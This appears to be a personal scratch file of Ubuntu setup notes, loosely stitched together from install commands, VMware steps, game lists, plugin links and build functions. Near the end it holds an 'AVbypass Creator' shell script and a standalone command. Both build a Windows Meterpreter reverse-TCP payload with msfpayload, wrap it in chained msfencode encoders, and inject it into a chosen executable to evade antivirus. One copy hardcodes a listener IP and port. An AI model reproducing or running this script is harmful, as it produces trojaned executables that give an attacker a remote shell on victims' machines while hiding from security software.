http://ubuntuguide.org/wiki/Ubuntu:Natty

# StartManager (Grub Config Editor)
sudo apt-get install startupmanager menu

# Crea Pacchetti debian
# https://wiki.ubuntu.com/PackagingGuide/Basic?action=show&redirect=HowToBuildDebianPackagesFromScratch
# http://www.ibm.com/developerworks/linux/library/l-debpkg.html
sudo apt-get install checkinstall


#VMWare

VMWare is a commercial virtualization platform that currently offers two free products: VMWare Player and VMWare Server (the latter with a free renewable yearly license). VMWare Player can play virtual appliances that have already been created, whereas VMWare Server (which has a broader range of features) allows the creation of virtual machines. In general, VMWare Server is recommended unless you only need to play an appliance. (Appliances will also run in VMWare Server). Users that wish to run servers (or processes) that need to be available to a network from within the virtual machine should use VMServer. If you wish to install a new OS within a virtual machine (other than in an appliance), you will need VMWare Server.
VMWare Player

Installation instructions are on the website, or at the Ubuntu community wiki. In brief, to install the free VMWare Player:

    Install pre-requisites:

sudo apt-get install build-essential linux-headers-$(uname -r)

    Get the binary package/installation script, give it executable privileges, then run the installation script:

wget http://download3.vmware.com/software/vmplayer/VMware-Player-2.5.3-185404.i386.bundle
chmod +x VMware-Player-2.5.3-185404.i386.bundle
sudo ./VMware-Player-2.5.3-185404.i386.bundle

# Create an Ubuntu Appliance
# While any edition of Ubuntu can be installed in a virtual machine, the minimal installation option (F4) of the Ubuntu Server creates a highly-efficient edition (previously known as JeOS) optimised for use within a virtual appliance (which can then be played using VMWare Player or other virtual machine client). See this walkthrough.
# A virtual appliance for VMWare Player (using this JeOS minimal server) can also be built using vmbuilder.

# VMWare Server

sudo apt-get install build-essential linux-headers-$(uname -r)

    Download the server source files for your architecture (32-bit or 64-bit) from the VMWare Server website and retrieve your license key by email.
    Extract the files, give execution privileges to the install script, and run the install script:

tar xvf VMware-server-2.0.1-156745.i386.tar.gz
cd vmware-server-distrib
chmod +x vmware-install.pl
sudo ./vmware-install.pl

VMWare Package

VMWare Appliances (that include an Ubuntu/Debian OS) can be created using VMWare Server and the VMWare Package utility. These appliances can then be deployed to users who can play them using VMWare Player. Install:

sudo apt-get install vmware-package

Keyboard errors in VMware guest

After installing VMWare 6.5, and installing a guest OS, the Function, arrow and Del/End/etc keys do not function. This is a bug with VMWare´s code. Add this line to ~/.vmware/config (create file if necessary) to fix this issue:

xkeymap.nokeycodeMap = true

##################################################################################################################################

# DosBox
# DOSBox is a DOS-emulator that emulates CPU:286/386 realmode/protected mode, Directory FileSystem/XMS/EMS, Tandy/Hercules/CGA/EGA/VGA/VESA graphics, and a SoundBlaster/Gravis Ultra Sound card (for sound compatibility with older games). You can "re-live" classic games that otherwise won't run on newer computers.
sudo apt-get install dosbox

# Gramps
# http://gramps-project.org/
gramps -- map your family-tree and co-operate with genealogy projects

# Games

# http://whdb.com/2008/top-25-linux-games-for-2008/
# http://rangit.com/software/top-8-linux-games-of-2007/
    PouetChess -- an excellent 3-D chess game (sudo apt-get install pouetchess)
    PokerTH -- a very nice Texas Hold Em Poker (install using PPA repository)
    Kajongg -- a real MahJongg game, for humans and/or robots (sudo apt-get install kajongg)
    Planet Penguin Racer -- Penguin slides down a 3-D luge run, catching fish. (Extreme Tux Racer is a newer version, but works in 32-bit only.)
    KsirK -- play Risk against the computer or in a multiplayer environment (sudo apt-get install kdegames)
    Racer -- the 3-D "real deal" Car Racing game (install binary found here). Also with extra tracks and add-ons.
    TORCS -- the 3-D Car Racing game (sudo apt-get install torcs)
    Supertuxkart -- the go-kart racing game (sudo apt-get install supertuxkart)
    Pingus -- a Lemmings clone (similar to Super Mario Bros.) that uses penguins instead of lemmings (sudo apt-get install pingus)
    Frozen Bubble -- the bubble-popping game (sudo apt-get install frozen-bubble)
    Frets on Fire -- similar to Guitar Hero. You can import songs from Guitar Hero and from community sites (sudo apt-get install fretsonfire)
    Scorched3d -- turn-based artillery game in a 3D rendered landscape (sudo apt-get install scorched3d)
    Pyscrabble (and pyscrabble-server) -- online Scrabble game and server (sudo apt-get install pyscrabble pyscrabble-server) (Also see Lexulous and the Internet Scrabble Club for browser-based online games similar to Scrabble. Internet Scrabble Club requires Java: sudo apt-get install default-jre )

http://vdrift.net/

http://www.urbanterror.net/
http://www.urbanterror.info/docs/texts/110/

https://help.ubuntu.com/community/Doom3



#################################################################################################################################

# Firefox Plugin
https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/
https://addons.mozilla.org/en-US/firefox/addon/video-downloadhelper/
https://addons.mozilla.org/en-US/firefox/addon/youtube-to-mp3/
https://addons.mozilla.org/en-US/firefox/addon/febe/
https://www.eff.org/files/https-everywhere-latest.xpi
http://www.addons.mozilla.org/en-USt/firefox/addon/illimitux
https://www.torproject.org/dist/torbutton/torbutton-current.xpi

http://fireftp.mozdev.org/


# Webcam
http://www.ws4gl.org/download/installing-on-ubuntu

# Tv
sudo apt-get install miro

# ZoneMinder http://www.zoneminder.com/
sudo apt-get install zoneminder ffmpeg
# Install_MythZoneMinder http://mythtv.org/wiki/index.php/MythZoneMinder
sudo apt-get install mythzoneminder

# Email Server
# http://ubuntuguide.org/wiki/Mail_Server_setup
sudo apt-get install dovecot-postfix

# Wiki
# http://www.mediawiki.org/
sudo apt-get install mediawiki
sudo nano /etc/mediawiki/apache.conf

Uncomment (remove the #) the line:

Alias /mediawiki /var/lib/mediawiki

# Drumpal (Web Plublishing)
http://drupal.org/

# Web Gallery
sudo apt-get install gallery2

# Kompozer (Web Development)
sudo apt-get install kompozer

# Forum
sudo apt-get install phpbb3


# Debian Repositories
http://wiki.debian.org/HowToSetupADebianRepository
https://help.ubuntu.com/community/Repositories/Personal
https://help.ubuntu.com/community/AptGet/Offline/Repository

# 3G
https://wiki.ubuntu.org/NetworkManager/Hardware/3G/Probing

# GPS
http://tuxmobil.org/linux_gps_navigation_applications.html
http://viking.sourceforge.net/mediawiki/index.php/Main_Page
sudo apt-get install viking

# Dynamic DNS
http://ubuntuguide.org/wiki/Dynamic_IP_servers
https://help.ubuntu.com/community/DynamicDNS

# Espeak

# ClamAv
http://wiki.ubuntu-it.org/Sicurezza/Clamav?highlight=(clamav)
git clone http://git.clamav.net/clamav-devel.git
cd clamav-devel
./configure
make
make install
cd ..
rm -fr clamav-devel
# ChRootkit

# Xmount
# HAL
# Ivman

deluge "bittorent client" on \
screen "allows multiple terminals in one session" on \


http://launchpad.net/nokinux/trunk/0.0.8.6/+download/nokinux-0.0.8.6.tar.gz

series60-remote

cat | sed -e 's/£+/"/g' >>

https://www.virustotal.com/


f_wine () {

svn checkout svn://wine-svn.troy.rollo.name/wine/wine/trunk wine-svn

cd wine-svn

./configure

make

make depend

make install

cd $HOME

}


f_driftnet () { # libpcap-dev libjpeg8-dev libungif libgtk-3-dev libglib-dev2.0 mpg123 libgif-dev libgtk2.0-dev

echo -n "[*] Installing Driftnet ... "

timelapsed &

axel http://www.ex-parrot.com/~chris/driftnet/driftnet-0.1.6.tar.gz 1> /dev/null

tar xvfz driftnet-0.1.6.tar.gz 1> /dev/null
cd driftnet-0.1.6

make 1> /dev/null
make install 1> /dev/null

cd ..

rm -fr driftnet-0.16
rm -f driftnet-0.16.tar.gz

cd $HOME

touch $HOME/pio.txt
sleep 1
rm -f $HOME/pio.txt
echo ""

}

f_driftnet

medusa


netcat

http://tldp.org/HOWTO/NCURSES-Programming-HOWTO/
http://www.ibiblio.org/pub/Linux/docs/HOWTO/other-formats/pdf/NCURSES-Programming-HOWTO.pdf

http://docs.python.org/contents.html

http://www.bin-co.com/tcl/tutorial/intro.php
http://www.bin-co.com/tcl/tutorial/syntax.php

http://www.activestate.com/activetcl/downloads/thank-you?dl=http://downloads.activestate.com/ActiveTcl/releases/8.5.11.0/ActiveTcl8.5.11.0.295402-win32-ix86-threaded.exe
http://www.activestate.com/activetcl/downloads/thank-you?dl=http://downloads.activestate.com/ActiveTcl/releases/8.5.11.0/ActiveTcl8.5.11.0.295407-win32-x86_64-threaded.exe


f_globus_preview () {


axel http://launchpad.net/gloobus/gloobus-0.4/0.4.1/+download/gloobus-preview-0.4.1.tar.gz 1> /dev/null

tar xvfz gloobus-preview-0.4.1.tar.gz 1> /dev/null

cd gloobus-preview-0.4.1

./configure 1> /dev/null
make 1> /dev/null
make install 1> /dev/null

}

Boxee - Incredible Open Source Multimedia Center

http://www.freesmscraze.com/
http://www.pinger.com/content/home.html

echo ""  >> /etc/apt/sources.list
echo "Repository Postler/Dexter" >> /etc/apt/sources.list
echo "deb http://ppa.launchpad.net/postler-dev/devel/ubuntu natty main"  >> /etc/apt/sources.list
echo "deb-src http://ppa.launchpad.net/postler-dev/devel/ubuntu natty main"  >> /etc/apt/sources.list
apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 91F758B9 1> /dev/null


http://tools.seobook.com/authority-finder/index.htm#source

# Ettercap + SET
http://www.backtrack-linux.org/forums/showthread.php?t=43225

##################################################################################################################################

#!/bin/sh
# (C)opyright 2010 - pigtail23
# AVbypass Creator v. 1.0 (2010-06-06)
#msfpayload windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 R | msfencode -c $c -e x86/shikata_ga_nai -x -->>> /pentest/windows-binaries/tools/tftpd32.exe <<<-- -t exe > $4$c.exe
#/pentest/windows-binaries/tools/tftpd32.exe <--- you can use a file of your choise

echo "sh avbypass.sh <IP> <Port> <Number of times to encode> <ExeOrigin> <Filename>"

if [[  $1 ]]; then echo "IP:" $1 ; else echo "IP not set"; exit 0; fi
if [[  $2 ]]; then echo "Port:" $2 ; else echo "Port not set"; exit 0; fi
if [[  $3 ]]; then echo "Number:" $3 ; else echo "Set Number"; exit 0; fi
if [[  $4 ]]; then echo "Exe:" $4 ; else echo "Set Exe To Encode"; exit 0; fi
if [[  $5 ]]; then echo "Filename:" $5 ; else echo "Set Filename"; exit 0; fi
echo "File/-s creating. Pls Wait..."

for (( c=1; c<=$3; c++ ))
do
	#msfpayload windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 R | msfencode -c $c -e x86/shikata_ga_nai -x $4 -t exe > $5$c.exe
	msfpayload windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 R | msfencode -e x86/shikata_ga_nai -c $c -x $4 -t raw | msfencode -e x86/call4_dword_xor -c $c -x $4 -t raw | msfencode -e x86/fnstenv_mov -c $c -x $4 -t raw | msfencode -e x86/countdown -c $c -x $4-t raw | msfencode -e x86/shikata_ga_nai -c $c -x $4 -t exe > $5$c.exe

echo "File" $5$c".exe was created."

done

####################################################################################################################################

cd /pentest/exploits/framework3
msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.25.26 LPORT=1417 R | msfencode -e x86/shikata_ga_nai -c $c -x $4 -t raw | msfencode -e x86/call4_dword_xor -c $c -x $4 -t raw | msfencode -e x86/fnstenv_mov -c $c -x $4 -t raw | msfencode -e x86/countdown -c $c -x $4-t raw | msfencode -e x86/shikata_ga_nai -c $c -x $4 -t exe > $5$c.exe

###################################################################################################################################

http://sites.google.com/site/lupingreycorner/vulnserver.zip

##################################################################################################################################

#!/usr/bin/perl
open(FILE, "<$ARGV[0]") || die("Cannot open file $ARGV[0]\n\n");
binmode(FILE);
while (read FILE, $data, 1){
	$encode .= '%' . sprintf( "%02x", ord($data));
}

print $encode;

#########################################################################################################################################à


<a href="http://ipligence.com"><img src="http://www.ipligence.com/freetools/iplocation/b1/" alt="geolocation database" /></a>



<a href="http://ipligence.com"><img src="http://www.ipligence.com/freetools/iplocation/b2/" alt="geolocation database" /></a>



xterm -hold -geometry 75x25+700+40 -T "IO" -e "( echo "ciao"; bash)"





cat * | sed -e 's/[:print:]^//g' | sed -e 's/[:cntrl:]*//g' | sed -e '/aaa/d' | sed -e '/bbb/d' | sed -e '/ccc/d' | sed -e '/ddd/d' | sed -e '/eee/d' | sed -e '/fff/d' | sed -e '/ggg/d' | sed -e '/hhh/d' | sed -e '/iii/d' | sed -e '/jjj/d' | sed -e '/kkk/d' | sed -e '/lll/d' | sed -e '/mmm/d' | sed -e '/nnn/d' | sed -e '/ooo/d' | sed -e '/ppp/d' | sed -e '/qqq/d' | sed -e '/rrr/d' | sed -e '/sss/d' | sed -e '/ttt/d' | sed -e '/uuu/d' | sed -e '/vvv/d' | sed -e '/www/d' | sed -e '/xxx/d' | sed -e '/yyy/d' | sed -e '/zzz/d' | sed -e '/ààà/d' | sed -e '/èèè/d' | sed -e '/ììì/d' | sed -e '/òòò/d' | sed -e '/ùùù/d' | sed -e '/£££/d' | sed -e '/&&&/d' | sed -e '/ççç/d' | sed -e '/§§§/d' | sort -u >> 3medium.txt && wc -l *

